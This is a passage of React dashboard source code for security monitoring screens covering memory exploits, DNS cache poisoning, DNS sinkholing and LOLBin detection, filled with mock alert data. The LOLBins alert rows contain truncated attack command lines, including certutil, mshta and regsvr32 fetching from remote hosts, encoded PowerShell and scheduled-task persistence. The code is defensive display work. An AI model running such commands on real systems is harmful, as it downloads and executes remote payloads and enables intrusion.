            {kpis.map(([title, value, sub, color, icon]) => <section key={title} style={{ minHeight: 78, border: `1px solid ${color}33`, borderRadius: 6, background: `linear-gradient(135deg,${color}18,rgba(6,17,32,.98) 60%)`, padding: 11, display: 'grid', gridTemplateColumns: '38px 1fr', gap: 9, alignItems: 'center' }}><span style={{ width: 34, height: 34, borderRadius: 7, display: 'grid', placeItems: 'center', color, background: `${color}18`, border: `1px solid ${color}44`, fontSize: 18 }}>{icon}</span><span><b style={{ color: '#dbeafe', fontSize: 8.5 }}>{title}</b><strong style={{ display: 'block', color: '#f8fbff', fontSize: 22, lineHeight: 1.05 }}>{value}</strong><small style={{ color, fontSize: 8 }}>{sub} vs last 24h</small></span></section>)}
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.1fr 1.05fr .72fr', gap: 8 }}>
            <Panel title="Memory Health Overview"><div style={{ height: 175, display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', alignItems: 'center', padding: 12 }}><Ring label="RAM Utilization" value={73} sub="11.7GB / 16GB" color={MON.blue} /><Ring label="Virtual Memory" value={68} sub="21.6GB / 32GB" color={MON.purple} /><Ring label="Swap / Page File" value={45} sub="7.2GB / 16GB" color={MON.green} /></div></Panel>
            <Panel title="Memory Usage Timeline"><div style={{ height: 175, padding: 14, backgroundImage: `linear-gradient(${MON.line} 1px, transparent 1px),linear-gradient(90deg,${MON.line} 1px,transparent 1px)`, backgroundSize: '52px 32px' }}>{monitorSpark([54, 58, 56, 62, 61, 66, 64, 73, 71, 76, 75, 82, 78, 81, 77, 79, 76, 74, 75], MON.blue, 'transparent', 112)}{monitorSpark([35, 37, 42, 39, 43, 49, 52, 57, 56, 61, 58, 55, 54, 52, 50, 53, 49, 51, 47], MON.purple, 'transparent', 112)}</div></Panel>
            <Panel title="Alert Severity Distribution"><div style={{ display: 'grid', gridTemplateColumns: '130px 1fr', alignItems: 'center', padding: 12 }}><Donut value={44} label={alertTotal.toLocaleString()} color={MON.red} accent={MON.orange} /><BarList rows={[{ label: 'Critical', value: 73, valueLabel: '73 (5.85%)', color: MON.red }, { label: 'High', value: 342, valueLabel: '342 (27.4%)', color: MON.orange }, { label: 'Medium', value: 547, valueLabel: '547 (43.9%)', color: MON.yellow }, { label: 'Low', value: 286, valueLabel: '286 (22.8%)', color: MON.blue }]} /></div></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.25fr .55fr .55fr', gap: 8 }}>
            <Panel title="Recent Memory Overflow Events" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="62px .75fr .75fr .9fr 1.55fr 62px" rows={events} /></Panel>
            <Panel title="Process Injection Monitoring" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="1fr 45px 58px" rows={[['DLL Injection', '124', '↑ 18.1%'], ['Process Hollowing', '43', '↑ 22.8%'], ['Remote Thread Injection', '68', '↑ 16.6%'], ['Reflective DLL Loading', '32', '↑ 11.7%'], ['Shellcode Execution', '75', '↑ 20.4%']]} /></Panel>
            <Panel title="Exploit Detection" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="1fr 45px 58px" rows={[['Stack Overflow Attempts', '56', '↑ 17.5%'], ['Heap Corruption', '48', '↑ 16.3%'], ['ROP Attempts', '37', '↑ 18.8%'], ['DEP Bypass Attempts', '29', '↑ 14.2%'], ['ASLR Bypass Attempts', '31', '↑ 15.6%']]} /></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '.7fr .7fr .85fr .8fr', gap: 8 }}>
            <Panel title="Sensitive Process Protection" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="1fr 42px 58px" rows={[['LSASS Access Attempts', '19', '↑ 11.8%'], ['EDR Agent Tampering', '8', '↑ 33.3%'], ['Antivirus Memory Access', '13', '↑ 8.3%'], ['Credential Dumping Attempts', '22', '↑ 22.2%']]} /></Panel>
            <Panel title="Malware in Memory" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="1fr 42px 58px" rows={[['Fileless Malware Detection', '24', '↑ 20.0%'], ['PowerShell Payloads', '31', '↑ 19.2%'], ['In-Memory Ransomware', '9', '↑ 12.5%'], ['Obfuscated Payloads', '17', '↑ 21.4%']]} /></Panel>
            <Panel title="Top Memory Consuming Processes" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="1fr 55px 52px .8fr" rows={[['java.exe', '2.35 GB', '18.6%', 'APP-SRV02'], ['nginx.exe', '1.89 GB', '12.3%', 'WEB-SRV01'], ['mysqld.exe', '1.67 GB', '15.7%', 'DB-SRV01'], ['dotnet.exe', '1.23 GB', '9.8%', 'APP-SRV03'], ['chrome.exe', '1.05 GB', '8.4%', 'WIN-CLT-25']]} /></Panel>
            <Panel title="Recent Critical Alerts" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="1fr .8fr 56px" rows={[['Buffer Overflow Detected', 'WEB-SRV01', '22:22:15'], ['Process Hollowing Detected', 'APP-SRV02', '22:21:48'], ['Shellcode Injection Detected', 'DB-SRV01', '22:20:57'], ['LSASS Memory Access Detected', 'DC-SRV01', '22:19:33'], ['Memory Corruption Event', 'FILE-SRV03', '22:18:42']]} /></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.25fr .85fr', gap: 8 }}>
            <Panel title="Asset / Host Overview"><MiniRows columns="1fr .85fr .85fr 80px 80px 55px 58px" rows={[['WEB-SRV01', '10.10.10.21', 'Windows Server 2019', '73%', '68%', '5', 'Critical'], ['APP-SRV02', '10.10.10.22', 'Windows Server 2016', '81%', '74%', '7', 'Critical'], ['DB-SRV01', '10.10.10.23', 'Windows Server 2019', '69%', '62%', '3', 'Warning'], ['FILE-SRV03', '10.10.10.24', 'Windows Server 2016', '62%', '55%', '2', 'Warning'], ['WIN-CLT-25', '10.10.10.45', 'Windows 10 Pro', '58%', '49%', '1', 'Normal']]} /></Panel>
            <Panel title="Memory Overflow Heatmap (Last 24h)" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><GeoLoginMap compact /></Panel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading memory overflow events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function LegacyDnsCachePoisoningDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const queryTotal = Math.max(Number(total || alerts.length || 0), 125843);
  const Panel = ({ title, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', padding: '9px 12px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950 }}>{title}{right}</div>
      {children}
    </section>
  );
  const MiniRows = ({ rows, columns = '1fr 70px 70px' }) => (
    <div style={{ padding: '0 10px 8px' }}>
      {rows.map((row, index) => <div key={row.join('|')} style={{ display: 'grid', gridTemplateColumns: columns, gap: 8, padding: '7px 0', borderTop: index ? `1px solid ${MON.line}` : 0, color: '#dbeafe', fontSize: 9.5, alignItems: 'center' }}>{row.map((cell, i) => <span key={i} style={{ color: /high|203\.|185\.|alert/i.test(String(cell)) ? MON.red : /medium|warning/i.test(String(cell)) ? MON.orange : /online|low/i.test(String(cell)) ? MON.green : undefined, fontWeight: i === 0 || /high|medium|online/i.test(String(cell)) ? 900 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{cell}</span>)}</div>)}
    </div>
  );
  const kpis = [
    ['DNS Queries', queryTotal.toLocaleString(), '↑ 12.6%', MON.purple, '◎'],
    ['Suspicious Queries', '312', '↑ 18.4%', MON.yellow, '△'],
    ['Cache Poisoning Alerts', '2', '↑ 100%', MON.red, '☠'],
    ['DNS Servers Monitored', '12', 'Online', MON.blue, '▤'],
  ];
  const poisonRows = [
    ['10:18:24 AM', 'High', '192.168.10.45', 'www.bank-secure.com', 'A', '93.184.216.34', '185.220.101.23', 'Multiple Responses', '10.0.0.53', '◎'],
    ['09:52:11 AM', 'Medium', '192.168.10.78', 'login.payments.com', 'A', '104.21.45.67', '203.0.113.55', 'Unexpected IP', '10.0.0.53', '◎'],
  ];
  return (
    <SocDashboardShell kind="dnscachepoisoning" active="dns-security" navBadges={{ alerts: 2, 'dns-security': 2 }}>
      <div style={{ overflow: 'auto', padding: 10, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1120, display: 'grid', gap: 9 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: 12 }}>
            <div style={{ display: 'grid', gridTemplateColumns: '42px 1fr', gap: 12, alignItems: 'center' }}>
              <span style={{ width: 38, height: 38, borderRadius: 8, display: 'grid', placeItems: 'center', color: MON.blue, background: `${MON.blue}18`, border: `1px solid ${MON.blue}44`, fontSize: 22 }}>盾</span>
              <span><h2 style={{ margin: 0, color: '#f3f8ff', fontSize: 19, fontWeight: 950 }}>DNS Cache Poisoning Detection</h2><b style={{ color: MON.muted, fontSize: 10 }}>Monitor and detect suspicious DNS activities indicative of cache poisoning attempts.</b></span>
            </div>
            <div style={{ display: 'flex', gap: 8 }}><button style={{ border: `1px solid ${MON.line}`, background: '#071827', color: '#cbd5e1', borderRadius: 5, height: 32, padding: '0 12px', fontSize: 10 }}>Last 24 Hours⌄</button><button style={{ border: `1px solid ${MON.line}`, background: '#071827', color: '#cbd5e1', borderRadius: 5, height: 32, padding: '0 12px', fontSize: 10 }}>Filter</button><button style={{ border: `1px solid ${MON.line}`, background: '#071827', color: '#cbd5e1', borderRadius: 5, height: 32, padding: '0 12px', fontSize: 10 }}>Export⌄</button></div>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: 8 }}>
            {kpis.map(([title, value, sub, color, icon]) => <section key={title} style={{ minHeight: 84, border: `1px solid ${color}33`, borderRadius: 6, background: `linear-gradient(135deg,${color}18,rgba(6,17,32,.98) 60%)`, padding: 13, display: 'grid', gridTemplateColumns: '42px 1fr', gap: 11, alignItems: 'center' }}><span style={{ width: 38, height: 38, borderRadius: 8, display: 'grid', placeItems: 'center', color, background: `${color}18`, border: `1px solid ${color}44`, fontSize: 21 }}>{icon}</span><span><b style={{ color: '#dbeafe', fontSize: 10 }}>{title}</b><strong style={{ display: 'block', color: '#f8fbff', fontSize: 24, lineHeight: 1.05 }}>{value}</strong><small style={{ color: sub === 'Online' ? MON.green : color, fontSize: 8 }}>{sub} vs yesterday</small></span></section>)}
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.25fr .9fr .85fr', gap: 8 }}>
            <Panel title="DNS Query Volume">
              <div style={{ height: 210, padding: 14, backgroundImage: `linear-gradient(${MON.line} 1px, transparent 1px),linear-gradient(90deg,${MON.line} 1px,transparent 1px)`, backgroundSize: '54px 34px' }}>
                {monitorSpark([5800, 7100, 5200, 6800, 5400, 5600, 7300, 9000, 6100, 6500, 5400, 7200, 5100, 5600, 8100, 8300, 5900, 6100, 5200, 6800, 6400, 4800, 5700, 4300], MON.blue, 'transparent', 135)}
                {monitorSpark([300, 550, 280, 900, 520, 620, 410, 1200, 600, 740, 530, 900, 470, 560, 1300, 620, 510, 480, 390, 740, 560, 430, 650, 1050], MON.red, 'transparent', 135)}
              </div>
            </Panel>
            <Panel title="Query Types Distribution"><div style={{ display: 'grid', gridTemplateColumns: '145px 1fr', alignItems: 'center', padding: 12 }}><Donut value={71} label={queryTotal.toLocaleString()} color={MON.blue} accent={MON.green} /><BarList rows={[{ label: 'A Record', value: 71, valueLabel: '71.2%', color: MON.blue }, { label: 'AAAA Record', value: 13, valueLabel: '12.8%', color: MON.green }, { label: 'CNAME Record', value: 7, valueLabel: '7.4%', color: MON.yellow }, { label: 'MX Record', value: 5, valueLabel: '4.6%', color: MON.purple }, { label: 'Others', value: 4, valueLabel: '4.0%', color: MON.muted }]} /></div></Panel>
            <Panel title="Suspicious Query Indicators"><MiniRows columns="1fr 42px" rows={[['Multiple Responses for Same Query', '124'], ['Unexpected IP for Domain', '98'], ['Low TTL Values', '45'], ['NS Record Anomalies', '23'], ['TxID Mismatch', '22'], ['View All Indicators →', '→']]} /></Panel>
          </div>
          <Panel title="DNS Cache Poisoning Alerts">
            <MiniRows columns="78px 70px .9fr 1fr 48px .9fr .9fr 1fr .75fr 35px" rows={poisonRows} />
            <div style={{ textAlign: 'center', color: MON.cyan, fontSize: 10, fontWeight: 900, padding: '7px 0 10px' }}>View All Alerts →</div>
          </Panel>
          <div style={{ display: 'grid', gridTemplateColumns: '.8fr 1.15fr 1.25fr', gap: 8 }}>
            <Panel title="Top Suspicious Domains"><div style={{ padding: 12 }}><BarList rows={[{ label: 'www.bank-secure.com', value: 45, valueLabel: '45', color: MON.red }, { label: 'login.payments.com', value: 32, valueLabel: '32', color: MON.red }, { label: 'update.security.com', value: 21, valueLabel: '21', color: MON.red }, { label: 'account.verify.net', value: 18, valueLabel: '18', color: MON.red }, { label: 'mail.service.org', value: 14, valueLabel: '14', color: MON.red }]} /></div></Panel>
            <Panel title="DNS Server Status"><MiniRows columns="1fr 72px 90px 90px" rows={[['10.0.0.53', 'Online', '2,345', '0.28%'], ['10.0.0.54', 'Online', '1,987', '0.15%'], ['10.0.0.55', 'Online', '1,765', '0.19%'], ['10.0.0.56', 'Online', '1,234', '0.22%']]} /></Panel>
            <Panel title="Detection Trend (Last 7 Days)"><div style={{ padding: 16, height: 150, display: 'grid', gridTemplateColumns: '34px repeat(7,1fr)', gap: 12, alignItems: 'end' }}><div style={{ height: 112, display: 'grid', alignContent: 'space-between', color: MON.muted, fontSize: 9 }}>{['25', '20', '15', '10', '5', '0'].map(v => <span key={v}>{v}</span>)}</div>{[['May 14', 2], ['May 15', 5], ['May 16', 7], ['May 17', 3], ['May 18', 23], ['May 19', 5], ['May 20', 2]].map(([label, value]) => <span key={label} style={{ display: 'grid', gap: 6, alignItems: 'end', textAlign: 'center', fontSize: 9 }}><i style={{ height: `${Math.max(10, Number(value) * 4.5)}px`, background: MON.red, borderRadius: 4, boxShadow: `0 0 12px ${MON.red}55` }} /><small style={{ color: MON.muted }}>{label}</small></span>)}</div></Panel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading DNS cache poisoning events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function LegacyDnsSinkholeDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const queryTotal = Math.max(Number(total || alerts.length || 0), 58420);
  const Panel = ({ title, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', padding: '9px 12px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950 }}>{title}{right}</div>
      {children}
    </section>
  );
  const MiniRows = ({ rows, columns = '1fr 70px 70px' }) => (
    <div style={{ padding: '0 10px 8px' }}>
      {rows.map((row, index) => <div key={row.join('|')} style={{ display: 'grid', gridTemplateColumns: columns, gap: 8, padding: '6px 0', borderTop: index ? `1px solid ${MON.line}` : 0, color: '#dbeafe', fontSize: 9.5, alignItems: 'center' }}>{row.map((cell, i) => <span key={i} style={{ color: /high|malicious|command|virus|red|blocked/i.test(String(cell)) ? MON.red : /medium|phishing|botnet/i.test(String(cell)) ? MON.orange : /online|allowed|healthy/i.test(String(cell)) ? MON.green : undefined, fontWeight: i === 0 || /high|medium|online|blocked/i.test(String(cell)) ? 900 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{cell}</span>)}</div>)}
    </div>
  );
  const kpis = [
    ['Total DNS Queries', `${(queryTotal / 1000).toFixed(2)} K`, '↑ 18.6%', MON.blue, '⌘'],
    ['Sinkhole Hits', '1.26 K', '↑ 24.8%', MON.red, '☣'],
    ['Blocked Domains', '842', '↑ 16.3%', MON.blue, '盾'],
    ['Malicious Domains', '562', '↑ 21.7%', MON.red, '☣'],
    ['Agent Endpoints', '125', 'Online · 100% Healthy', MON.cyan, '▱'],
  ];
  const maliciousDomains = [['malicious-badsite.com', '256', 'High', '15 Jun 08:12 AM', '15 Jun 10:45 AM'], ['command-and-control.net', '189', 'High', '15 Jun 07:41 AM', '15 Jun 10:40 AM'], ['virus-download.info', '142', 'High', '15 Jun 06:31 AM', '15 Jun 10:30 AM'], ['phishing-site.org', '118', 'Medium', '15 Jun 05:22 AM', '15 Jun 10:28 AM'], ['botnet-cnc.ru', '95', 'Medium', '15 Jun 04:11 AM', '15 Jun 10:20 AM']];
  const sinkholeAlerts = [['10:45:21 AM', 'malicious-badsite.com', 'A Record', '192.168.10.45', 'WIN-CLT-045', 'High'], ['10:44:18 AM', 'command-and-control.net', 'A Record', '192.168.10.27', 'SRV-APP-12', 'High'], ['10:43:07 AM', 'phishing-site.org', 'CNAME', '192.168.10.33', 'WIN-CLT-033', 'Medium'], ['10:42:39 AM', 'malware-dropper.com', 'A Record', '192.168.10.58', 'SRV-DB-02', 'High'], ['10:41:55 AM', 'suspicious-domain.ru', 'AAAA', '192.168.10.19', 'WIN-CLT-019', 'Medium']];
  return (
    <SocDashboardShell kind="dnssinkhole" active="dns-sinkhole" navBadges={{ alerts: 12, 'dns-sinkhole': 1260 }}>
      <div style={{ overflow: 'auto', padding: 8, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1120, display: 'grid', gap: 8 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5,1fr)', gap: 8 }}>
            {kpis.map(([title, value, sub, color, icon]) => <section key={title} style={{ minHeight: 84, border: `1px solid ${color}33`, borderRadius: 6, background: `linear-gradient(135deg,${color}18,rgba(6,17,32,.98) 60%)`, padding: 12, display: 'grid', gridTemplateColumns: '42px 1fr', gap: 10, alignItems: 'center' }}><span style={{ width: 38, height: 38, borderRadius: title === 'Sinkhole Hits' ? 19 : 8, display: 'grid', placeItems: 'center', color, background: `${color}18`, border: `1px solid ${color}44`, fontSize: 20 }}>{icon}</span><span><b style={{ color: '#dbeafe', fontSize: 9 }}>{title}</b><strong style={{ display: 'block', color: '#f8fbff', fontSize: 23, lineHeight: 1.05 }}>{value}</strong><small style={{ color: /Online/.test(sub) ? MON.green : color, fontSize: 8 }}>{sub} vs yesterday</small></span></section>)}
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.18fr .95fr .75fr', gap: 8 }}>
            <Panel title="DNS Sinkhole Activity (24 Hours)">
              <div style={{ height: 188, padding: 14, backgroundImage: `linear-gradient(${MON.line} 1px, transparent 1px),linear-gradient(90deg,${MON.line} 1px,transparent 1px)`, backgroundSize: '52px 32px' }}>
                {monitorSpark([360, 320, 350, 380, 410, 350, 380, 300, 270, 250, 320, 440, 410, 300, 280, 350, 270, 260, 210, 190], MON.blue, 'transparent', 116)}
                {monitorSpark([190, 160, 200, 225, 240, 205, 220, 150, 140, 170, 255, 230, 250, 180, 175, 210, 150, 130, 115, 100], MON.red, 'transparent', 116)}
                {monitorSpark([58, 70, 82, 94, 102, 80, 72, 60, 58, 77, 125, 100, 112, 76, 60, 80, 72, 64, 58, 52], MON.green, 'transparent', 116)}
              </div>
            </Panel>
            <Panel title="Sinkhole Status"><GeoLoginMap compact /></Panel>
            <Panel title="Query Types"><div style={{ display: 'grid', gridTemplateColumns: '132px 1fr', alignItems: 'center', padding: 12 }}><Donut value={46} label="58.42K" color={MON.blue} accent={MON.green} /><BarList rows={[{ label: 'A Record', value: 46, valueLabel: '45.6%', color: MON.blue }, { label: 'AAAA Record', value: 23, valueLabel: '22.8%', color: MON.green }, { label: 'CNAME Record', value: 16, valueLabel: '15.7%', color: MON.orange }, { label: 'MX Record', value: 9, valueLabel: '8.9%', color: MON.purple }, { label: 'Others', value: 7, valueLabel: '7.0%', color: MON.muted }]} /></div></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
            <Panel title="Top Malicious Domains Blocked" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="1.35fr 70px 80px 105px 105px" rows={maliciousDomains} /><div style={{ color: MON.red, fontSize: 10, fontWeight: 950, padding: '0 10px 9px' }}>Total Malicious Domains: 562</div></Panel>
            <Panel title="Recent Sinkhole Alerts" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="78px 1.25fr .75fr .9fr .9fr 58px" rows={sinkholeAlerts} /></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr .8fr .8fr', gap: 8 }}>
            <Panel title="Top Endpoints Generating Sinkhole Hits"><MiniRows columns="1fr .9fr 90px 70px 65px" rows={[['WIN-CLT-045', '192.168.10.45', '312', '1.2K', 'Online'], ['SRV-APP-12', '192.168.10.27', '201', '856', 'Online'], ['WIN-CLT-033', '192.168.10.33', '178', '745', 'Online'], ['SRV-DB-02', '192.168.10.58', '143', '612', 'Online'], ['WIN-CLT-019', '192.168.10.19', '98', '421', 'Online']]} /></Panel>
            <Panel title="Blocked vs Allowed Queries"><div style={{ display: 'grid', gridTemplateColumns: '132px 1fr', alignItems: 'center', padding: 12 }}><Donut value={82} label="81.6%" color={MON.green} accent={MON.red} /><div style={{ display: 'grid', gap: 8 }}><strong style={{ color: MON.red, fontSize: 20 }}>18.4%</strong><b style={{ color: MON.text, fontSize: 11 }}>Blocked</b><span style={{ color: MON.muted, fontSize: 10 }}>(10.7K)</span></div></div></Panel>
            <Panel title="Threat Categories"><div style={{ padding: 12 }}><BarList rows={[{ label: 'Malware', value: 39, valueLabel: '38.6%', color: MON.red }, { label: 'Phishing', value: 28, valueLabel: '28.4%', color: MON.orange }, { label: 'Botnet C&C', value: 19, valueLabel: '18.7%', color: MON.yellow }, { label: 'Adware', value: 10, valueLabel: '9.8%', color: MON.purple }, { label: 'Others', value: 5, valueLabel: '4.5%', color: MON.muted }]} /></div></Panel>
          </div>
          <div style={{ border: `1px solid ${MON.line}`, borderRadius: 5, background: '#061827', color: MON.cyan, fontSize: 10, padding: '8px 12px' }}>● DNS Sinkhole protects your network by intercepting and blocking communication with malicious domains in real-time.</div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading DNS sinkhole events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function LolbinsDetectionDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const totalAlerts = Math.max(Number(total || alerts.length || 0), 342);
  const Panel = ({ title, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', padding: '9px 12px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950 }}>{title}{right}</div>
      {children}
    </section>
  );
  const MiniRows = ({ rows, columns = '1fr 70px 70px' }) => (
    <div style={{ padding: '0 10px 8px' }}>
      {rows.map((row, index) => <div key={row.join('|')} style={{ display: 'grid', gridTemplateColumns: columns, gap: 8, padding: '7px 0', borderTop: index ? `1px solid ${MON.line}` : 0, color: '#dbeafe', fontSize: 10, alignItems: 'center' }}>{row.map((cell, i) => <span key={i} style={{ color: /high|new/i.test(String(cell)) ? MON.red : /medium|progress/i.test(String(cell)) ? MON.orange : /low|closed/i.test(String(cell)) ? MON.green : undefined, fontWeight: i === 0 || /high|medium|low|new|closed/i.test(String(cell)) ? 900 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{cell}</span>)}</div>)}
    </div>
  );
  const kpis = [
    ['Total LOLBin Alerts', totalAlerts, '↑ 18%', MON.red, '☣'],
    ['High Severity', 98, '↑ 22%', MON.red, '⬢'],
    ['Medium Severity', 156, '↑ 12%', MON.orange, '⬢'],
    ['Low Severity', 88, '↓ 5%', MON.green, '⬢'],
    ['Endpoints Affected', 74, '↑ 8%', MON.purple, '▱'],
    ['LOLBins Executed', 21, '↑ 15%', MON.blue, '⌘'],
  ];
  const trend = [42, 45, 39, 31, 38, 51, 36, 30, 42, 48, 44, 41, 82, 63, 68, 58, 66, 52, 88, 79, 90];
  const lolbinRows = [
    ['PowerShell.exe', '28.5%', '97'],
    ['Cmd.exe', '19.4%', '66'],
    ['Wmic.exe', '14.4%', '49'],
    ['Rundll32.exe', '9.1%', '31'],
    ['Regsvr32.exe', '6.5%', '22'],
    ['Mshta.exe', '5.0%', '17'],
    ['Certutil.exe', '4.1%', '14'],
    ['Bitsadmin.exe', '3.0%', '10'],
    ['Others', '9.0%', '31'],
  ];
  const alertRows = [
    ['10:30:15 AM', 'WIN-10-21H2\n10.10.1.25', 'CORP\\j.smith', 'PowerShell.exe', 'powershell.exe -enc SQBFA...', 'Execution', 'High', 'New'],
    ['10:28:42 AM', 'SRV-DC-01\n10.10.1.10', 'NT AUTHORITY\\SYSTEM', 'Wmic.exe', 'wmic process call create "cmd.e...', 'Lateral Movement', 'High', 'New'],
    ['10:27:18 AM', 'WIN-10-21H2\n10.10.1.25', 'CORP\\a.kumar', 'Certutil.exe', 'certutil.exe -urlcache -f http://185...', 'Defense Evasion', 'Medium', 'In Progress'],
    ['10:26:01 AM', 'WIN-11-22H2\n10.10.1.30', 'CORP\\v.patel', 'Rundll32.exe', 'rundll32.exe javascript:"\\..\\mshta...', 'Execution', 'High', 'New'],
    ['10:24:55 AM', 'WIN-10-21H2\n10.10.1.45', 'CORP\\m.verma', 'Mshta.exe', 'mshta.exe http://malicious.site/p...', 'Execution', 'Medium', 'In Progress'],
    ['10:23:33 AM', 'SRV-FILE-02\n10.10.1.15', 'CORP\\svc_backup', 'Bitsadmin.exe', 'bitsadmin /transfer download_job ...', 'Defense Evasion', 'Low', 'Closed'],
    ['10:22:10 AM', 'WIN-10-21H2\n10.10.1.80', 'CORP\\jha', 'Regsvr32.exe', 'regsvr32.exe /s /n /u /i:http://185...', 'Persistence', 'Medium', 'New'],
    ['10:20:45 AM', 'WIN-11-22H2\n10.10.1.35', 'CORP\\k.gupta', 'Schtasks.exe', 'schtasks /create /sc onlogon /tn...', 'Persistence', 'Medium', 'In Progress'],
  ];
  const selected = alertRows[0];
  return (
    <SocDashboardShell kind="lolbins" active="overview">
      <div style={{ overflow: 'auto', padding: 10, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1180, display: 'grid', gap: 9 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: 12 }}>
            <div><h2 style={{ margin: 0, color: '#f3f8ff', fontSize: 18, fontWeight: 950 }}>Living-off-the-Land (LOLBins) Detection</h2><b style={{ color: MON.muted, fontSize: 10 }}>Monitor suspicious use of Living-off-the-Land binaries</b></div>
            <div style={{ display: 'flex', gap: 8 }}><button style={{ border: `1px solid ${MON.line}`, background: '#071827', color: MON.muted, borderRadius: 5, height: 28, padding: '0 10px', fontSize: 10 }}>Last 24 Hours</button><button style={{ border: `1px solid ${MON.line}`, background: '#071827', color: MON.cyan, borderRadius: 5, height: 28, padding: '0 10px', fontSize: 10 }}>Refresh</button></div>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6,1fr)', gap: 8 }}>
            {kpis.map(([title, value, sub, color, icon]) => <section key={title} style={{ minHeight: 82, border: `1px solid ${color}33`, borderRadius: 6, background: `linear-gradient(135deg,${color}1a,rgba(6,17,32,.98) 60%)`, padding: 12, display: 'grid', gridTemplateColumns: '42px 1fr', gap: 10, alignItems: 'center' }}><span style={{ width: 35, height: 35, borderRadius: '50%', display: 'grid', placeItems: 'center', color, background: `${color}18`, border: `1px solid ${color}44`, fontSize: 16 }}>{icon}</span><span><b style={{ color: '#dbeafe', fontSize: 9 }}>{title}</b><strong style={{ display: 'block', color: '#f3f8ff', fontSize: 22, lineHeight: 1.05 }}>{value}</strong><small style={{ color, fontSize: 8 }}>{sub} vs yesterday</small></span></section>)}
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.1fr .82fr 1fr', gap: 8 }}>
            <Panel title="LOLBins Execution Trend" right={<span style={{ color: MON.muted, fontSize: 9 }}>Last 24 Hours⌄</span>}><div style={{ height: 190, padding: 14, backgroundImage: `linear-gradient(${MON.line} 1px, transparent 1px),linear-gradient(90deg,${MON.line} 1px,transparent 1px)`, backgroundSize: '52px 32px' }}>{monitorSpark(trend, MON.blue, 'rgba(20,133,255,.16)', 130)}</div></Panel>
            <Panel title="Top LOLBins Detected"><div style={{ display: 'grid', gridTemplateColumns: '140px 1fr', alignItems: 'center', padding: 13 }}><Donut value={28} label={String(totalAlerts)} color={MON.red} accent={MON.orange} /><BarList rows={lolbinRows.map(([label, pct, count], i) => ({ label, value: Number(pct), valueLabel: `${pct} (${count})`, color: [MON.blue, MON.red, MON.green, MON.yellow, MON.purple, MON.cyan, MON.orange, '#94a3b8'][i % 8] }))} /></div></Panel>
            <Panel title="LOLBins by Category"><div style={{ padding: 14 }}><BarList rows={[{ label: 'Execution', value: 100, valueLabel: '124 (36%)', color: MON.red }, { label: 'Persistence', value: 69, valueLabel: '85 (25%)', color: MON.orange }, { label: 'Defense Evasion', value: 49, valueLabel: '61 (18%)', color: MON.yellow }, { label: 'Lateral Movement', value: 31, valueLabel: '38 (11%)', color: MON.green }, { label: 'Discovery', value: 17, valueLabel: '21 (6%)', color: MON.blue }, { label: 'Collection', value: 10, valueLabel: '12 (4%)', color: MON.purple }]} /></div></Panel>
          </div>
